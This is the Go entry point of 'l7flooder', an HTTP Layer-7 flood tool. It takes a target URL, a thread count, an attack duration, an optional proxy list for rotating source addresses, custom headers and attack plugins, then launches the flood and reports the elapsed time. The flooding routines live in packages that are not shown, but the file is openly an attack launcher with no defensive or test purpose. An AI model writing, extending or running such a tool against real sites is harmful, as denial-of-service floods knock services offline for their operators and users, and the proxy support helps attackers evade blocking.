package main

import (
	"flag"
	"fmt"
	"os"
	"time"
	"l7flooder/internal/attack"
	"l7flooder/internal/metrics"
	"l7flooder/pkg/plugins"
)

func main() {
	target := flag.String("target", "", "Target URL (e.g. https://example.com)")
	threads := flag.Int("threads", 100, "Number of concurrent threads")
	duration := flag.Int("duration", 60, "Attack duration in seconds")
	proxies := flag.String("proxies", "", "Path to proxy list file (optional)")
	method := flag.String("method", "GET", "HTTP method (GET/POST)")
	headers := flag.String("headers", "", "Custom headers, comma-separated (e.g. 'User-Agent:foo,Referer:bar')")
	pluginName := flag.String("plugin", "", "Attack plugin to use (optional)")
	flag.Parse()

	if *target == "" {
		fmt.Println("Target is required")
		os.Exit(1)
	}

	// register default plugins
	plugins.RegisterPlugin(&plugins.ExamplePlugin{})

	if *pluginName != "" {
		p, err := plugins.GetPlugin(*pluginName)
		if err != nil {
			fmt.Println("Plugin error:", err)
			os.Exit(1)
		}
		fmt.Printf("Starting plugin attack: %s (%s)\n", p.Name(), p.Description())
		params := map[string]string{
			"proxies": *proxies,
			"headers": *headers,
			"method":  *method,
		}
		start := time.Now()
		err = p.Run(*target, *threads, *duration, params)
		if err != nil {
			fmt.Println("Plugin run error:", err)
		}
		fmt.Println("Attack finished.")
		fmt.Printf("Elapsed: %v\n", time.Since(start))
		return
	}

	fmt.Printf("Starting L7 flood: %s with %d threads for %d seconds\n", *target, *threads, *duration)
	if *proxies != "" {
		fmt.Printf("Using proxies from: %s\n", *proxies)
	}
	if *headers != "" {
		fmt.Printf("Custom headers: %s\n", *headers)
	}

	start := time.Now()
	metrics := &metrics.Metrics{}
	attack.StartAttack(*target, *threads, *duration, *proxies, *method, *headers, metrics)
	fmt.Println("Attack finished.")
	fmt.Printf("Elapsed: %v\n", time.Since(start))
}
